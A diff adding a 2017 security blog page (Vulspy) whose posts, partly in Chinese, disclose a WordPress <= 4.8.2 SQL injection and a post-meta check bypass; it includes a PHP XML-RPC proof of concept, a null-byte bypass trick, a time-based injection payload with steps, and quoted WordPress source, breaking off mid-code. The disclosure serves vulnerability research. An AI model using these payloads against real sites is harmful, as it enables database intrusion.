@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulspy Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Vulspy Blog">
+<meta property="og:url" content="http://blog.vulspy.com/index.html">
+<meta property="og:site_name" content="Vulspy Blog">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulspy Blog">
+  
+    <link rel="alternate" href="/atom.xml" title="Vulspy Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-108901411-1');
+  </script>
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Vulspy Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Vulspy Blog</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.vulspy.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Wordpress-4-8-2-SQL-Injection-POC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" class="article-date">
+  <time datetime="2017-11-09T11:13:04.000Z" itemprop="datePublished">2017-11-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: Ambulong@vulspy</p>
+<p>I found this vulnerability after reading <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">slavco’s post</a>, and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn’t pay attention to this report too.</p>
+<h2 id="SQL-Injection-Details"><a href="#SQL-Injection-Details" class="headerlink" title="# SQL Injection Details"></a># SQL Injection Details</h2><ul>
+<li><a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">Wordpress SQLi by slavco</a></li>
+<li><a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">Wordpress SQLi — PoC by slavco</a></li>
+<li><a href="https://medium.com/websec/wordpress-sqli-how-to-find-ebee713457e4" target="_blank" rel="external">Wordpress SQLi — how to find by slavco</a></li>
+<li><a href="https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html" target="_blank" rel="external">Disclosure: WordPress WPDB SQL Injection - Technical by ircmaxell</a></li>
+</ul>
+<h2 id="POC-Details"><a href="#POC-Details" class="headerlink" title="# POC Details"></a># POC Details</h2><p>If you already found out the potential sqli in wordpress, you would know that we need to insert our playload into <code>_thumbnail_id</code> meta in order to launch the sqli attack.</p>
+<h3 id="Wordpress-≤-4-7-4-Lack-of-capability-checks-for-post-meta-data-in-the-XML-RPC-API"><a href="#Wordpress-≤-4-7-4-Lack-of-capability-checks-for-post-meta-data-in-the-XML-RPC-API" class="headerlink" title="## Wordpress ≤ 4.7.4 Lack of capability checks for post meta data in the XML-RPC API"></a>## Wordpress ≤ 4.7.4 Lack of capability checks for post meta data in the XML-RPC API</h3><p>This vulnerability have mentioned in slavco’s post: <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">Wordpress SQLi</a></p>
+<p>Reference: <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p>
+<p><strong>POC</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$usr = <span class="string">'author'</span>;</div><div class="line">$pwd = <span class="string">'author'</span>;</div><div class="line">$xmlrpc = <span class="string">'http://local.target/xmlrpc.php'</span>;</div><div class="line">$client = <span class="keyword">new</span> IXR_Client($xmlrpc);</div><div class="line">$content = <span class="keyword">array</span>(<span class="string">"ID"</span> =&gt; <span class="number">6</span>, <span class="string">'meta_input'</span> =&gt; <span class="keyword">array</span>(<span class="string">"_thumbnail_id"</span>=&gt;<span class="string">"xxx"</span>));</div><div class="line">$res = $client-&gt;query(<span class="string">'wp.editPost'</span>,<span class="number">0</span>, $usr, $pwd, <span class="number">6</span><span class="comment">/*post_id*/</span>, $content);</div></pre></td></tr></table></figure>
+<h3 id="Wordpress-≤-4-8-2-POST-Meta-Protection-Bypass"><a href="#Wordpress-≤-4-8-2-POST-Meta-Protection-Bypass" class="headerlink" title="## Wordpress ≤ 4.8.2 POST Meta Protection Bypass"></a>## Wordpress ≤ 4.8.2 POST Meta Protection Bypass</h3><h4 id="A-trick-of-Mysql"><a href="#A-trick-of-Mysql" class="headerlink" title="A trick of Mysql"></a>A trick of Mysql</h4><p>1). A normal query for _thumbnail_id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+<p>2). Change the meta_value of _thumbnail_id to “\x00_thumbnail_id”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure>
+<p>3). Query by _thumbnail_id again</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+<h4 id="POST-Meta-Protection-Bypass"><a href="#POST-Meta-Protection-Bypass" class="headerlink" title="POST Meta Protection Bypass"></a>POST Meta Protection Bypass</h4><p>This is the <code>is_protected_meta</code>(<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>) method used to check the validation of post meta:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_protected_meta</span><span class="params">( $meta_key, $meta_type = null )</span> </span>&#123;</div><div class="line">    $protected = ( <span class="string">'_'</span> == $meta_key[<span class="number">0</span>] );</div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Filters whether a meta key is protected.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@since</span>](/since) 3.2.0</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) bool   $protected Whether the key is protected. Default false.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_key  Meta key.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_type Meta type.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">return</span> apply_filters( <span class="string">'is_protected_meta'</span>, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>The code just checks the first character of <code>$meta_key</code>, from the mysql trick, we can use <code>%00_</code> to bypass it.</p>
+<p><strong>POC</strong></p>
+<ol>
+<li>Add New Custom Field, Name:<code>_thumbnail_id</code> Value:<code>55 %1$%s or sleep(10)#</code></li>
+<li>Click <code>Add Custom Field</code> button.</li>
+<li>Modify the HTTP request, <code>_thumbnail_id</code> =&gt; <code>%00_thumbnail_id</code></li>
+<li>Launch the attack. Visit <code>/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#</code>.</li>
+</ol>
+<h4 id="Time-line"><a href="#Time-line" class="headerlink" title="Time-line:"></a>Time-line:</h4><ul>
+<li>Sep. 2th - I report the vulnerability to WP Team via Hackerone.</li>
+<li>Sep. 6th - WP Team ask for details.</li>
+<li>Sep. 6th - I post the details.</li>
+<li>Sep. 6th to now - I haven’t received any response yet…</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cj9y5qhhr0009lqpvklx3pork" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Wordpress-POST-META-Check-Bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/" class="article-date">
+  <time datetime="2017-09-04T16:00:00.000Z" itemprop="datePublished">2017-09-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：Ambulong@vulspy</p>
+<p>Wordpress中的POST META为<code>文章</code>的<code>自定义栏目/字段</code>，就如一篇<code>文章</code>中会有<code>标题</code>、<code>作者</code>等字段，但是对于有些主题/插件来说，<code>文章</code>中的自有字段显得不够用，就需要用到<code>自定义栏目/字段</code>。</p>
+<p><em>（该操作的位置在<code>添加/编辑文章</code>，在文本编辑框下方的<code>自定义栏目</code>，如果没有找到<code>自定义栏目</code>，需要在右上角的<code>显示选项</code>内将<code>自定义栏目</code>勾选。）</em></p>
+<p><code>自定义栏目/字段</code>的数据以<code>meta_key</code>（字段/栏目名）-&gt;<code>meta_value</code>（值）的形式存放在<code>wp_postmeta</code>表内。以<code>下划线</code>开头的<code>meta_key</code>（字段/栏目名）被认为是保留字段，不允许用户添加。</p>
+<p>本文将介绍如何绕过Wordpress的<code>meta_key</code>检查，添加字段/栏目名以<code>下划线</code>开头的<code>自定义栏目/字段</code>。</p>
+<h2 id="第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#第一章-Wordpress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞"></a>第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h2><p>参考内容：<a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p>
+<h3 id="1-1-POC"><a href="#1-1-POC" class="headerlink" title="1.1 POC"></a>1.1 POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$usr = <span class="string">'author'</span>;</div><div class="line">$pwd = <span class="string">'author'</span>;</div><div class="line">$xmlrpc = <span class="string">'http://local.target/xmlrpc.php'</span>;</div><div class="line">$client = <span class="keyword">new</span> IXR_Client($xmlrpc);</div><div class="line">$content = <span class="keyword">array</span>(<span class="string">"ID"</span> =&gt; <span class="number">6</span>, <span class="string">'meta_input'</span> =&gt; <span class="keyword">array</span>(<span class="string">"_thumbnail_id"</span>=&gt;<span class="string">"xxx"</span>));</div><div class="line">$res = $client-&gt;query(<span class="string">'wp.editPost'</span>,<span class="number">0</span>, $usr, $pwd, <span class="number">6</span><span class="comment">/*post_id*/</span>, $content);</div></pre></td></tr></table></figure>
+<p>POC来自 <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">Wordpress SQLi — PoC by slavco</a></p>
+<h3 id="1-2-漏洞分析"><a href="#1-2-漏洞分析" class="headerlink" title="1.2 漏洞分析"></a>1.2 漏洞分析</h3><p><strong>补丁位置：<a href="https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b" target="_blank" rel="external">wp-includes/class-wp-xmlrpc-server.php</a> </strong></p>
+<img src="/2017/09/05/Wordpress-POST-META-Check-Bypass/1.2.1.png" alt="漏洞分析" title="漏洞分析">
+<p>根据补丁的内容，是将传入的$content_struct内容进行了白名单限制，同时也过滤了POC中的<code>meta_input</code>。</p>
+<p>1.先看修复后的_insert_post函数中我们关注代码（文件：<a href="https://github.com/WordPress/WordPress/blob/e88a48a066ab2200ce3091b131d43e2fab2460a4/wp-includes/class-wp-xmlrpc-server.php#L1297" target="_blank" rel="external">wp-includes/class-wp-xmlrpc-server.php</a>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_insert_post</span><span class="params">( $user, $content_struct )</span> </span>&#123;</div><div class="line">	$defaults = <span class="keyword">array</span>(</div><div class="line">		...<span class="comment">//ignore</span></div><div class="line">		<span class="string">'custom_fields'</span>  =&gt; <span class="keyword">null</span>,</div><div class="line">		<span class="string">'terms_names'</span>    =&gt; <span class="keyword">null</span>,</div><div class="line">		<span class="string">'terms'</span>          =&gt; <span class="keyword">null</span>,</div><div class="line">		<span class="string">'sticky'</span>         =&gt; <span class="keyword">null</span>,</div><div class="line">		<span class="string">'enclosure'</span>      =&gt; <span class="keyword">null</span>,</div><div class="line">		<span class="string">'ID'</span>             =&gt; <span class="keyword">null</span>,</div><div class="line">	);</div><div class="line">	$post_data = wp_parse_args( array_intersect_key( $content_struct, $defaults ), $defaults );</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	<span class="keyword">if</span> ( <span class="keyword">isset</span>( $post_data[<span class="string">'custom_fields'</span>] ) )</div><div class="line">		<span class="keyword">$this</span>-&gt;set_custom_fields( $post_ID, $post_data[<span class="string">'custom_fields'</span>] );</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	$post_ID = $update ? wp_update_post( $post_data, <span class="keyword">true</span> ) : wp_insert_post( $post_data, <span class="keyword">true</span> );</div><div class="line">	<span class="keyword">if</span> ( is_wp_error( $post_ID ) )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">500</span>, $post_ID-&gt;get_error_message() );</div><div class="line">	<span class="keyword">if</span> ( ! $post_ID )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">401</span>, __( <span class="string">'Sorry, your entry could not be posted.'</span> ) );</div><div class="line">	<span class="keyword">return</span> strval( $post_ID );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>按正常的业务流程，POST META应当是从<code>custom_fields</code>中获取，之后带入set_custom_fields函数中，而且set_custom_fields函数会对<code>meta_key</code>进行检查，不应当存在问题。</p>
+<p>但是在wp_update_post函数与wp_insert_post函数中，会从$post_data[‘meta_input’]中取出数据，不经检查直接添加到<code>自定义栏目/字段</code>中。</p>
+<p>2.函数wp_insert_post中我们关注的代码（文件：<a href="https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974" target="_blank" rel="external">wp-includes/post.php</a>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span><span class="params">( $postarr, $wp_error = false )</span> </span>&#123;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	$postarr = wp_parse_args($postarr, $defaults);</div><div class="line">	<span class="keyword">unset</span>( $postarr[ <span class="string">'filter'</span> ] );</div><div class="line">	$postarr = sanitize_post($postarr, <span class="string">'db'</span>);</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'meta_input'</span>] ) ) &#123;</div><div class="line">		<span class="keyword">foreach</span> ( $postarr[<span class="string">'meta_input'</span>] <span class="keyword">as</span> $field =&gt; $value ) &#123;</div><div class="line">			update_post_meta( $post_ID, $field, $value );</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="第二章-Wordpress-≤-4-8-2-POST-META-校验绕过漏洞"><a href="#第二章-Wordpress-≤-4-8-2-POST-META-校验绕过漏洞" class="headerlink" title="第二章 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞"></a>第二章 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞</h2><p><strong>该章节更新时间：2017年11月09日</strong></p>
+<p>吐槽：该缺陷于9月初<a href="https://hackerone.com/reports/265484" target="_blank" rel="external">报告</a>给WP Team，然而2个多月过去了仍然只有9月5号的一条回复。:(</p>
+<p>Wordpress目前最新版为4.8.3，建议大家更新。</p>
+<h3 id="2-1-一个MySQL的trick"><a href="#2-1-一个MySQL的trick" class="headerlink" title="2.1 一个MySQL的trick"></a>2.1 一个MySQL的trick</h3><p>1). 正常的条件查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>2). 现在我们将_thumbnail_id修改成”\x00_thumbnail_id”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
+<p>3). 再次执行第一步的查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>我们可以发现依然可以查询出修改后的数据。</p>
+<h3 id="2-2-POST-META-校验绕过"><a href="#2-2-POST-META-校验绕过" class="headerlink" title="2.2 POST META 校验绕过"></a>2.2 POST META 校验绕过</h3><p>我们来看下检查<code>meta_key</code>的代码，文件<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_protected_meta</span><span class="params">( $meta_key, $meta_type = null )</span> </span>&#123;</div><div class="line">    $protected = ( <span class="string">'_'</span> == $meta_key[<span class="number">0</span>] );</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Filters whether a meta key is protected.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@since</span>](/since) 3.2.0</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) bool   $protected Whether the key is protected. Default false.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_key  Meta key.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_type Meta type.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">return</span> apply_filters( <span class="string">'is_protected_meta'</span>, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>is_protected_meta</code>函数只检查了<code>$meta_key</code>的第一个字符是否以<code>_</code>开头。我们有了2.1的MySQL trick，想要绕过<code>meta_key</code>的检查就显得容易多了。</p>
+<h3 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h3><p>在添加<code>自定义栏目/字段</code>时抓包，将_thumbnail_id替换为%00_thumbnail_id。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>WordPress 4.7.5 Security and Maintenance Release - <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a></li>
+<li>Wordpress SQLi — PoC by slavco - <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cj9y5qhhd0003lqpvgulqyd8d" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Wordpress-SQL-Injection-Analysis-2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" class="article-date">
+  <time datetime="2017-09-02T17:14:41.000Z" itemprop="datePublished">2017-09-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：Ambulong@VulSpy</p>
+<ul>
+<li><a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a></li>
+<li><a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a></li>
+</ul>
+<p>在上一篇文章 <a href="/2017/09/05/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a> 中，我们分析了Wordpress中的prepare函数在什么情况下会产生SQL注入漏洞。本篇文章将分析Wordpress中的一处SQL注入。</p>
+<p>当前最新版：Wordpress 4.8.1</p>
+<h2 id="第三章：发现Wordpress中的SQL注入"><a href="#第三章：发现Wordpress中的SQL注入" class="headerlink" title="第三章：发现Wordpress中的SQL注入"></a>第三章：发现Wordpress中的SQL注入</h2><h3 id="3-1-SQL注入分析"><a href="#3-1-SQL注入分析" class="headerlink" title="3.1 SQL注入分析"></a>3.1 SQL注入分析</h3><p>在delete_metadata函数（文件：<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L307" target="_blank" rel="external">/wp-includes/meta.php</a>）中存在如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_metadata</span><span class="params">($meta_type, $object_id, $meta_key, $meta_value = <span class="string">''</span>, $delete_all = false)</span> </span>&#123;</div><div class="line">	<span class="keyword">global</span> $wpdb;</div><div class="line">	<span class="keyword">if</span> ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) &amp;&amp; ! $delete_all ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line">	$object_id = absint( $object_id );</div><div class="line">	<span class="keyword">if</span> ( ! $object_id &amp;&amp; ! $delete_all ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line">	$table = _get_meta_table( $meta_type );</div><div class="line">	<span class="keyword">if</span> ( ! $table ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line">	$type_column = sanitize_key($meta_type . <span class="string">'_id'</span>);</div><div class="line">	$id_column = <span class="string">'user'</span> == $meta_type ? <span class="string">'umeta_id'</span> : <span class="string">'meta_id'</span>;</div><div class="line">	<span class="comment">// expected_slashed ($meta_key)</span></div><div class="line">	$meta_key = wp_unslash($meta_key);</div><div class="line">	$meta_value = wp_unslash($meta_value);</div><div class="line">	</div><div class="line">	$check = apply_filters( <span class="string">"delete_&#123;$meta_type&#125;_metadata"</span>, <span class="keyword">null</span>, $object_id, $meta_key, $meta_value, $delete_all );</div><div class="line">	<span class="keyword">if</span> ( <span class="keyword">null</span> !== $check )</div><div class="line">		<span 